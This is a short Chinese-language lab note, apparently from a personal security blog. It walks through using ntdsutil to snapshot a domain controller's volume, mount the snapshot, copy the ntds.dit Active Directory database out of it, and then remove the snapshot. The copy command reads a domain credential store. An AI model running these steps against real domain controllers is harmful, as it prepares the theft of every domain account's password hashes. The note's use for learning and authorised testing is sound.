ailx10说：这篇是2022年1月之前写的，后来又改过。域控文件被系统占着时，我开始试卷影副本。用 ntdsutil 建快照、按 GUID 挂载，再从映出的路径复制 NTDS，最后卸载并删除自己建的副本，整套步骤像是绕开了“正在使用”这个障碍。笔记把每个状态都留着，方便以后分清原文件和快照里的文件。它并没有直接把域口令变成明文，后面离线处理还需要匹配的系统材料；做这一轮更重要的是认识快照怎么呈现数据，以及收尾时怎样准确找到自己的实验对象。

---

本文记录使用 ntdsutil 和卷影快照复制 NTDS 数据库的历史实验。目录数据库与 SYSVOL 中的 GPP XML 是不同数据来源。

![](/notes-assets/5ab3d4c42cec9bef50ce.webp)

本实验工具名称为 ntdsutil.exe。

ntdsutil 是 Windows 活动目录管理工具。下方为原实验的创建、挂载和复制流程，具体支持范围依系统版本而异。

第一步：创建快照

```
ntdsutil.exe snapshot "activate instance ntds" create q q
```

产生的快照GUID为：

```
{850bc5ab-7620-48fa-bd1f-c23c8150a3f0}
```

![](/notes-assets/0c6efdb9f518d46c8900.webp)

第二步：加载快照

快照位置：`C:\$SNAP_202009222211_VOLUMEC$\`

```
ntdsutil.exe snapshot "mount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" q q
```

![](/notes-assets/2e2a934f171abc92cd6c.webp)

第三步：复制快照中的ntds.dit文件

```
copy 'C:\$SNAP_202009222211_VOLUMEC$\Windows\NTDS\ntds.dit' C:\ailx10\ntds\ntds.dit
```

![](/notes-assets/4f021d0ecc3dfd4043b4.webp)

---

实验结束应根据快照标识准确卸载并清理本次创建的快照；删除快照不等于删除系统日志。

第一步：查看

```
ntdsutil.exe snapshot "List All" q q
```

![](/notes-assets/41fb26dcbd2d71c585e7.webp)

第二步：按实验快照标识清理

```
ntdsutil.exe snapshot "umount {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" "delete {850bc5ab-7620-48fa-bd1f-c23c8150a3f0}" q q
```

![](/notes-assets/9502be091d9b8d381392.webp)

第三步：再查看（确定全部删除成功）

![](/notes-assets/9e08fc9382a1958c1b25.webp)![](/notes-assets/4f8dac5cd4d1824845d8.webp)

本篇完\~

拿到NTDS文件只是材料准备，不等于凭据已经读出来。把配套材料和后续处理分开，再记清自己创建的快照，收尾时也不容易误动其他备份。
